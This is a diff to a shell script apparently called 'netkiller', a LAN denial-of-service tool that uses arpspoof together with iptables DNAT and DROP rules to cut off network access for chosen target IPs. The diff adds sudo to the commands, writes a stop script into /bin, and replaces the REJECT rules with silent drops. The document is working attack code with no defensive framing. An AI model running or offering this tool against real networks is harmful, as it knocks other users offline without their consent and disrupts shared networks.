@@ -68,21 +68,21 @@ echo "TARGETS:   | $INPUT_IPS"
 echo ""
 
 # Enable IP Forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Create stop script
 cat > /bin/netkiller-stop << EOF
 #!/bin/sh
 
-sudo ip -s -s neigh flush all
-iptables -t nat -F
-iptables -F FORWARD
-pkill -f arpspoof
+sudo ip -s -s neigh flush all >/dev/null
+sudo iptables -t nat -F
+sudo iptables -F FORWARD
+sudo pkill -f arpspoof
 echo "Netkiller is stopped!"
 sleep 2s
 echo "Restoring the client connections..."
 EOF
-chmod 755 /bin/netkiller-stop
+sudo chmod 755 /bin/netkiller-stop
 
 # Function to expand CIDR to individual IPs using ipcalc
 expand_cidr() {
@@ -144,9 +144,6 @@ for TARGET in $TARGET_IPS; do
         sudo iptables -P FORWARD DROP
         sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -A FORWARD -d "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-        sudo iptables -A FORWARD -d "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
-        sudo iptables -A FORWARD -d "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
         sudo iptables -A FORWARD -s "$TARGET" -j DROP
         sudo iptables -A FORWARD -d "$TARGET" -j DROP
      (
